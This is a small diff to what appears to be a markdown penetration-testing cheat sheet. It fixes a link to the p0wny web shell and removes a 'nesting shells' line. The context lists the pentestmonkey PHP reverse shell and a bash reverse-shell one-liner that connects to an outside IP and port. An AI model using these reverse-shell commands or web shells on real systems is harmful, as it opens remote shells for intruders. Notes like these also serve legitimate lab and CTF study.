@@ -8,7 +8,7 @@
 
 [pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell) 
 
-[pwney web shell]
+[p0wney web shell](https://github.com/flozz/p0wny-shell) 
 
 ## Reverse shell commands  
     bash -i >& /dev/tcp/10.6.85.85/4444 0>&1
@@ -34,10 +34,6 @@ PHP
 Also Ruby, Java: Reverse shells cheat sheet    
 [Tiberius Reverse Shells](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/reverse-shells.rst) 
 
-
-Nesting shells      
-
-  bash -p    /bin/sh -p 
 
 
 ## Upgrading to a pseudo terminal / TTY     
